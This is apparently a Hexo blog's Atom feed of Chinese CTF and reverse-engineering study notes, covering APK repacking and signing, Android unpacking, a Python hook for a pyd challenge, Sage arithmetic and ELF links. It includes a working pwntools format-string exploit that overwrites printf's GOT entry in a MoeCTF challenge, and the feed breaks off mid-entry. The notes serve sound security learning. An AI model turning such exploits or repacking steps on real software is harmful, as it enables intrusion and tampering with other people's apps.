<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>runwu2204</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-07-14T14:35:36.000Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>runwu2204</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>apk重打包</title>
    <link href="http://example.com/2024/07/14/Re/%E5%AE%89%E5%8D%93/apk%E9%87%8D%E6%89%93%E5%8C%85/"/>
    <id>http://example.com/2024/07/14/Re/%E5%AE%89%E5%8D%93/apk%E9%87%8D%E6%89%93%E5%8C%85/</id>
    <published>2024-07-14T14:25:10.000Z</published>
    <updated>2024-07-14T14:35:36.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>apktool d input.apk</code>解包input.apk 不能直接解压会出现确实某参数的问题</p><p><code>apktool b .\com.zrubfinance -o 1.apk</code></p><blockquote><p>注意 重封包的apk未进行内存对齐需通过</p><p><code>zipalign -p -f -v 4 input.apk out.apk</code></p><p>然后签名</p><p><code>apksigner sign -ks E:\keystore\test1.jks -out out.apk input.apk</code></p><p>就可以了</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;apktool d input.apk&lt;/code&gt;解包input.apk 不能直接解压会出现确实某参数的问题&lt;/p&gt;
&lt;p&gt;&lt;code&gt;apktool b .&#92;com.zrubfinance -o 1.apk&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;</summary>
      
    
    
    
    <category term="Re" scheme="http://example.com/categories/Re/"/>
    
    <category term="安卓" scheme="http://example.com/categories/Re/%E5%AE%89%E5%8D%93/"/>
    
    
  </entry>
  
  <entry>
    <title>脱壳</title>
    <link href="http://example.com/2024/07/13/Re/%E5%AE%89%E5%8D%93/%E8%84%B1%E5%A3%B3/"/>
    <id>http://example.com/2024/07/13/Re/%E5%AE%89%E5%8D%93/%E8%84%B1%E5%A3%B3/</id>
    <published>2024-07-12T16:49:25.000Z</published>
    <updated>2024-07-13T16:44:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><a class="link"   href="https://blog.csdn.net/shulianghan/article/details/121895054" >【Android 逆向】脱壳解决方案 ( DEX 整体加壳 | 函数抽取加壳 | VMP 加壳 | Dex2C 加壳 | Android 应用加固防护级别 )-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>[<a class="link"   href="https://bbs.kanxue.com/thread-281745.htm#msg_header_h1_10" >原创]关于最近脱壳的笔记 还请各位大佬指教-Android安全-看雪-安全社区|安全招聘|kanxue.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>普通的壳类似于SMC</p><h2 id="爱加密"><a href="#爱加密" class="headerlink" title="爱加密"></a>爱加密</h2><p>参考<a class="link"   href="https://blog.csdn.net/xiziyunqi/article/details/77514751" >脱掉“爱加密”家的壳_爱加密企业版脱壳-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>以application为基准</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/ZrubAppTheme&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@drawable/icon_logo&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;p000s.p001h.p002e.p003l.p004l.ApplicationC0014S&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:excludeFromRecents</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:testOnly</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hardwareAccelerated</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:largeHeap</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:extractNativeLibs</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:resizeableActivity</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:networkSecurityConfig</span>=<span class="string">&quot;@xml/network_security_config&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;s.h.e.l.l.A&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:requestLegacyExternalStorage</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowNativeHeapPointerTagging</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>此处添加了<code>android:name</code>项</p><p>参考<a class="link"   href="https://blog.csdn.net/qq_41767945/article/details/99697407" >AndroidManifest.xml中application name功能介绍_android application name-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>用于启用自己私有的<code>Application</code>类用来进行壳相关操作</p><p>Application有三类方法<code>attachBaseContext</code> <code>onCreate</code> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://blog.csdn.net/shulianghan/article/details/121895054&quot; &gt;【Android 逆向】脱壳解决方案 ( DEX 整体加壳 | 函数抽取加壳 | VMP 加壳 | D</summary>
      
    
    
    
    <category term="Re" scheme="http://example.com/categories/Re/"/>
    
    <category term="安卓" scheme="http://example.com/categories/Re/%E5%AE%89%E5%8D%93/"/>
    
    
  </entry>
  
  <entry>
    <title>复数域上的计算</title>
    <link href="http://example.com/2024/06/29/Crypto/RSA/%E5%A4%8D%E6%95%B0%E5%9F%9F%E4%B8%8A%E7%9A%84%E8%AE%A1%E7%AE%97/"/>
    <id>http://example.com/2024/06/29/Crypto/RSA/%E5%A4%8D%E6%95%B0%E5%9F%9F%E4%B8%8A%E7%9A%84%E8%AE%A1%E7%AE%97/</id>
    <published>2024-06-28T16:56:06.000Z</published>
    <updated>2024-06-28T16:56:14.000Z</updated>
    
    <content type="html"><![CDATA[<p><a class="link"   href="https://blog.csdn.net/XiongSiqi_blog/article/details/134742341" >complex_复数域rsa-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://blog.csdn.net/XiongSiqi_blog/article/details/134742341&quot; &gt;complex_复数域rsa-CSDN博客 &lt;i class=&quot;fa-regular fa-ar</summary>
      
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    <category term="RSA" scheme="http://example.com/categories/Crypto/RSA/"/>
    
    
  </entry>
  
  <entry>
    <title>hook</title>
    <link href="http://example.com/2024/06/27/Re/pyd/hook/"/>
    <id>http://example.com/2024/06/27/Re/pyd/hook/</id>
    <published>2024-06-27T08:58:37.000Z</published>
    <updated>2024-06-27T14:56:32.000Z</updated>
    
    <content type="html"><![CDATA[<p><a class="link"   href="https://mp.weixin.qq.com/s/IwKxtqDd-5v0xhg9UzKe-g" >2024 RCTF writeup by Arr3stY0u (qq.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>dir和help可以查看导出的对象</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> check_secret</span><br><span class="line"><span class="built_in">help</span>(check_secret)</span><br><span class="line"><span class="comment">#可通过hook对应的返回值和参数，查看对应进行的操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook</span>(<span class="params">func,name</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_hook</span>(<span class="params">a,b</span>):</span><br><span class="line">        res=func(a,b)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;a:&gt;08x&#125;</span> <span class="subst">&#123;name&#125;</span> 0x<span class="subst">&#123;b:&gt;08x&#125;</span>=0x<span class="subst">&#123;res:&gt;08x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> func_hook</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> check_secret.<span class="built_in">map</span>.keys():</span><br><span class="line">    check_secret.<span class="built_in">map</span>[i]=hook(check_secret.<span class="built_in">map</span>[i],i)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://mp.weixin.qq.com/s/IwKxtqDd-5v0xhg9UzKe-g&quot; &gt;2024 RCTF writeup by Arr3stY0u (qq.com) &lt;i class=&quot;fa-regular </summary>
      
    
    
    
    <category term="Re" scheme="http://example.com/categories/Re/"/>
    
    <category term="pyd" scheme="http://example.com/categories/Re/pyd/"/>
    
    
  </entry>
  
  <entry>
    <title>native开发</title>
    <link href="http://example.com/2024/06/27/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/native%E5%BC%80%E5%8F%91/"/>
    <id>http://example.com/2024/06/27/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/native%E5%BC%80%E5%8F%91/</id>
    <published>2024-06-26T16:37:04.000Z</published>
    <updated>2024-06-26T16:45:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>调用步骤</p><pre class="mermaid">graph TB;subgraph init_arrayA[手动声明的构造函数]-->B[带自定义类的静态变量]endB-->C[JNI_Onload]</pre><p>手动声明的构造函数</p><p>会自动填充在init_array里，按声明顺序依次排布</p><p>声明方法:</p><blockquote><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((constructor)) <span class="function"><span class="type">void</span> <span class="title">funcname</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><p>带自定类的静态变量</p><p>如std::string</p><p>声明在代码最开头</p><blockquote><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> std::string hello=<span class="string">&quot;String from JNI&quot;</span>;</span><br></pre></td></tr></table></figure></div></blockquote><p>如果是C++原始类型则不会放在init_array内</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;调用步骤&lt;/p&gt;
&lt;pre class=&quot;mermaid&quot;&gt;graph TB;

subgraph init_array
A[手动声明的构造函数]--&gt;B[带自定义类的静态变量]
end
B--&gt;C[JNI_Onload]&lt;/pre&gt;

&lt;p&gt;手动声明的构造函数&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="安卓开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>two_squre</title>
    <link href="http://example.com/2024/06/22/Crypto/sage/two_squre/"/>
    <id>http://example.com/2024/06/22/Crypto/sage/two_squre/</id>
    <published>2024-06-22T13:15:09.000Z</published>
    <updated>2024-06-28T11:48:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>two_squares(n)</p><blockquote><p>类似p^2+q^2的问题求解</p><p>可化成复数域的平方差</p><p>(p-iq)*(p+iq)</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;two_squares(n)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;类似p^2+q^2的问题求解&lt;/p&gt;
&lt;p&gt;可化成复数域的平方差&lt;/p&gt;
&lt;p&gt;(p-iq)*(p+iq)&lt;/p&gt;
&lt;/blockquote&gt;
</summary>
      
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    <category term="sage" scheme="http://example.com/categories/Crypto/sage/"/>
    
    
  </entry>
  
  <entry>
    <title>elf文件结构</title>
    <link href="http://example.com/2024/06/19/Pwn/linux/elf%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    <id>http://example.com/2024/06/19/Pwn/linux/elf%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</id>
    <published>2024-06-19T01:51:21.000Z</published>
    <updated>2024-06-19T01:51:34.000Z</updated>
    
    <content type="html"><![CDATA[<p><a class="link"   href="https://www.jianshu.com/p/5092d6d5caa3" >彻底搞清楚 GOT 和 PLT - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://www.jianshu.com/p/5092d6d5caa3&quot; &gt;彻底搞清楚 GOT 和 PLT - 简书 (jianshu.com) &lt;i class=&quot;fa-regular fa-arrow-up-righ</summary>
      
    
    
    
    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
    
    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>调用已经存在的lib</title>
    <link href="http://example.com/2024/06/11/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/%E8%B0%83%E7%94%A8%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84lib/"/>
    <id>http://example.com/2024/06/11/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/%E8%B0%83%E7%94%A8%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84lib/</id>
    <published>2024-06-10T16:55:50.000Z</published>
    <updated>2024-06-10T16:56:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>只</p><p>build.gradle</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    id <span class="string">&#x27;com.android.application&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    namespace <span class="string">&#x27;com.example.challengemobile&#x27;</span></span><br><span class="line">    compileSdk <span class="number">33</span></span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.example.challengemobile&quot;</span></span><br><span class="line">        minSdk <span class="number">28</span></span><br><span class="line">        targetSdk <span class="number">33</span></span><br><span class="line">        versionCode <span class="number">1</span></span><br><span class="line">        versionName <span class="string">&quot;1.0&quot;</span></span><br><span class="line"></span><br><span class="line">        testInstrumentationRunner <span class="string">&quot;androidx.test.runner.AndroidJUnitRunner&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled <span class="literal">false</span></span><br><span class="line">            proguardFiles <span class="title function_">getDefaultProguardFile</span><span class="params">(<span class="string">&#x27;proguard-android-optimize.txt&#x27;</span>)</span>, &#x27;proguard-rules.pro&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sourceSets &#123;</span><br><span class="line">        main &#123;<span class="comment">//只需要寫入這個即可</span></span><br><span class="line">            jniLibs.srcDirs = [<span class="string">&#x27;libs&#x27;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    compileOptions &#123;</span><br><span class="line">        sourceCompatibility JavaVersion.VERSION_1_8</span><br><span class="line">        targetCompatibility JavaVersion.VERSION_1_8</span><br><span class="line">    &#125;</span><br><span class="line">    ndkVersion <span class="string">&#x27;21.3.6528147&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line"></span><br><span class="line">    implementation <span class="string">&#x27;androidx.appcompat:appcompat:1.6.1&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;com.google.android.material:material:1.8.0&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;androidx.constraintlayout:constraintlayout:2.1.4&#x27;</span></span><br><span class="line">    testImplementation <span class="string">&#x27;junit:junit:4.13.2&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.ext:junit:1.1.5&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.espresso:espresso-core:3.5.1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;只&lt;/p&gt;
&lt;p&gt;build.gradle&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;C&quot;&gt;&lt;figure class=&quot;iseeu highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="安卓开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>golang_jar</title>
    <link href="http://example.com/2024/06/10/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/golang_jar/"/>
    <id>http://example.com/2024/06/10/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/golang_jar/</id>
    <published>2024-06-10T12:27:51.000Z</published>
    <updated>2024-06-10T12:28:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>gomobile</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;gomobile&lt;/p&gt;
</summary>
      
    
    
    
    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="安卓开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Fmtstr</title>
    <link href="http://example.com/2024/06/09/Pwn/linux/Fmtstr/"/>
    <id>http://example.com/2024/06/09/Pwn/linux/Fmtstr/</id>
    <published>2024-06-09T15:36:36.000Z</published>
    <updated>2024-06-09T18:57:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>主要利用<code>printf(&quot;用户输入&quot;)</code>达成任意地址读写</p><p>写入主要使用 <code>%n</code>占位符(将该占位符之前的字符数输出到对应地址)</p><blockquote><table><thead><tr><th>占位符</th><th>字节数</th></tr></thead><tbody><tr><td>%lln</td><td>8</td></tr><tr><td>%n</td><td>4</td></tr><tr><td>%hn</td><td>2</td></tr><tr><td>%hhn</td><td>1</td></tr></tbody></table></blockquote><p>再结合%数字$占位符</p><p>例如</p><blockquote><p>%2$s 指的就是第二个参数当作s输出</p></blockquote><p>结合这两个，如果我要写入一个’a’(0x61)到对应地址0x12345678，假设此时我的字符串在偏移3</p><p>就可以用<code>&quot;\x78\x56\x34\x12%93c%3$n&quot;</code>payload不唯一，可学习下pwntools中FmtStr的输出</p><p>Example</p><blockquote><p>[<a class="link"   href="https://www.nssctf.cn/problem/3332" >MoeCTF 2022]babyfmt | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>主要逻辑</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *s; // [esp+18h] [ebp-110h]</span><br><span class="line">  char buf[256]; // [esp+1Ch] [ebp-10Ch] BYREF</span><br><span class="line">  unsigned int v5; // [esp+11Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stderr, 0, 2, 0);</span><br><span class="line">  s = (char *)malloc(0x10u);</span><br><span class="line">  sprintf(s, &quot;%p&quot;, backdoor);</span><br><span class="line">  printf(&quot;gift: %p\n&quot;, s);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(buf, 0, sizeof(buf));</span><br><span class="line">    read(0, buf, 0xFFu);</span><br><span class="line">    printf(buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>exp:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">r&quot;/home/wrwrw/vscode/pwn/fmtstr/pwn&quot;</span>)</span><br><span class="line">debug=<span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> debug==<span class="literal">True</span>:</span><br><span class="line">    p=process(<span class="string">r&#x27;/home/wrwrw/vscode/pwn/fmtstr/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span> ,<span class="number">24923</span> )</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=<span class="string">&#x27;bash&#x27;</span>,endian = <span class="string">&quot;little&quot;</span>)<span class="comment">#需要设定对应的架构和端序才能正常使用fmtstr</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_read</span>(<span class="params">offset,addr,<span class="built_in">type</span></span>):</span><br><span class="line">    <span class="keyword">return</span> p32(addr)+(<span class="string">f&#x27;%<span class="subst">&#123;offset&#125;</span>$<span class="subst">&#123;<span class="built_in">type</span>&#125;</span>&#x27;</span>).encode() <span class="keyword">if</span> context.bits==<span class="number">32</span> <span class="keyword">else</span> p64(addr)+(<span class="string">f&#x27;%<span class="subst">&#123;offset&#125;</span>$<span class="subst">&#123;<span class="built_in">type</span>&#125;</span>&#x27;</span>).encode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">payload</span>):<span class="comment">#用于给FmtStr测试对应的我们input字符串的offset(相对于printf函数体内的栈顶)</span></span><br><span class="line">    p.sendline(payload)<span class="comment">#这是最简单的情况,其他的可能会结合判断语句什么的可根据这个适当修改</span></span><br><span class="line">    info = p.recv()</span><br><span class="line">    <span class="keyword">return</span> info<span class="comment">#FmtStr只需要获得对应输入的printf输出即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    gift_addr=<span class="built_in">int</span>(re.search(<span class="string">r&quot;gift: 0x([0-9a-f]*)&quot;</span>,p.recvline().decode().strip()).group(<span class="number">1</span>),<span class="number">16</span>)<span class="comment">#获取对应backdoor地址字符串的地址</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(gift_addr))</span><br><span class="line">    printf_got=elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">    fmt=FmtStr(exec_fmt)</span><br><span class="line">    p.send(fmtstr_read(fmt.offset,gift_addr,<span class="string">&#x27;s&#x27;</span>))<span class="comment">#获取对应backdoor地址</span></span><br><span class="line">    backdoor_addr=<span class="built_in">int</span>(p.recv()[<span class="number">4</span>:].decode(),<span class="number">16</span>)</span><br><span class="line">    payload=fmtstr_payload(fmt.offset,&#123;printf_got:backdoor_addr&#125;)<span class="comment">#将printf_got地址上写入backdoor_addr地址(大小取决于架构)</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要利用&lt;code&gt;printf(&amp;quot;用户输入&amp;quot;)&lt;/code&gt;达成任意地址读写&lt;/p&gt;
&lt;p&gt;写入主要使用 &lt;code&gt;%n&lt;/code&gt;占位符(将该占位符之前的字符数输出到对应地址)&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;</summary>
      
    
    
    
    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
    
    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>操作</title>
    <link href="http://example.com/2024/06/08/Pwn/linux/tool/pwndbg/%E6%93%8D%E4%BD%9C/"/>
    <id>http://example.com/2024/06/08/Pwn/linux/tool/pwndbg/%E6%93%8D%E4%BD%9C/</id>
    <published>2024-06-08T10:48:34.000Z</published>
    <updated>2024-06-08T17:26:28.000Z</updated>
    
    <content type="html"><![CDATA[<p><a class="link"   href="https://www.cnblogs.com/murkuo/p/15965270.html" >pwndbg 基本操作指令 - MuRKuo - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.bookstack.cn/read/CTF-All-In-One/doc-2.3.1_gdb.md#gdb-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C" >动态分析工具 - 2.3.1 GDB - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://www.cnblogs.com/murkuo/p/15965270.html&quot; &gt;pwndbg 基本操作指令 - MuRKuo - 博客园 (cnblogs.com) &lt;i class=&quot;fa-regular </summary>
      
    
    
    
    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
    
    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
    
    <category term="tool" scheme="http://example.com/categories/Pwn/linux/tool/"/>
    
